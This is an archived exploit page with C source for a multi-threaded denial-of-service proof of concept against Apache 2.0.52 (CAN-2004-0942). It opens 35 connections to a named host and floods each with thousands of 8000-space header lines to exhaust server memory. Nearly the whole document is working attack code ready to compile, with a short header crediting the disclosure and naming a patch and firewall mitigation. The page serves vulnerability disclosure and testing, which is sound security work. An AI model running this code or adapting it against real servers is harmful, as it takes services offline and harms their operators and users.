<html>
<head>
<title>Apache 2.0.52 Multiple Space Header Denial of Service Exploit (v2)</title>
<pre>
/*
Apache Squ1rt, Denial of Service Proof of Concept
Tested on Apache 2.0.52

j0hnylightning@gmail.com
dguido@gmail.com

Sends a request that starts with:
GET / HTTP/1.0\n
8000 spaces \n
8000 spaces \n
8000 spaces \n
...
8000 times

Apache never kills it. Takes up huge amounts of
RAM which increase with each connection.

Original credit goes to Chintan Trivedi on the
FullDisclosure mailing list:
http://seclists.org/lists/fulldisclosure/2004/Nov/0022.html

More info:
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2004-0942

Versions between 2.0.35 and 2.0.52 may be vulnerable,
but only down to 2.0.50 was tested.

This attack may be preventable with a properly configured
iptables ruleset. Gentoo already has a patch out in the
2.0.52-r1 release in the file 06_all_gentoo_protocol.patch

v2
Rewritten to use pthread.
gcc apache-squ1rt.c -lpthread
*/

#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;pthread.h&gt;
#define DEST_PORT 80

void *squirtIt(char *hName);

char attackBuf[8000];
char letsGetStarted[128];

int main(int argc, char **argv){
       int num_connect;
       int ret;
       pthread_t tid[35];

       sprintf(letsGetStarted, &quot;GET / HTTP/1.0\n&quot;);
       memset(attackBuf, ' ', 8000);
       attackBuf[7998]='\n';
       attackBuf[7999]='\0';

       if (argc != 2){
               fprintf(stderr, &quot;Usage: %s &lt;host name&gt; \n&quot;, argv[0]);
               exit(1);
       }

       for(num_connect = 0; num_connect &lt; 35; num_connect++){
               ret = pthread_create(&amp;tid[num_connect], NULL, (void *)squirtIt, argv[1]);
       }

       /* assuming any of these threads actually terminate, this waits for
all of them */
       for(num_connect = 0; num_connect &lt; 35; num_connect++){
               pthread_join(tid[num_connect], NULL);
       }

 return 0;
}

void *squirtIt(char *hName){
       int sock, i;
       struct hostent *target;
       struct sockaddr_in addy;

       if((target = gethostbyname(hName)) == NULL){
               herror(&quot;gethostbyname()&quot;);
               exit(1);
       }

       if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0){
               perror(&quot;socket()&quot;);
               exit(1);
       }

       addy.sin_family = AF_INET;
       addy.sin_port = htons(DEST_PORT);
       bcopy(target-&gt;h_addr, (char *)&amp;addy.sin_addr, target-&gt;h_length );
       memset(&amp;(addy.sin_zero), '\0', 8);

       if((connect(sock, (struct sockaddr*)&amp;addy, sizeof(addy))) &lt; 0){
               perror(&quot;connect()&quot;);
               exit(1);
       }

       send(sock, letsGetStarted, strlen(letsGetStarted), 0);

       for(i=0; i &lt; 8000; i++){
               send(sock, attackBuf, strlen(attackBuf), 0);
       }

       close(sock);
}

// milw0rm.com [2004-11-18]
</pre>
</html>

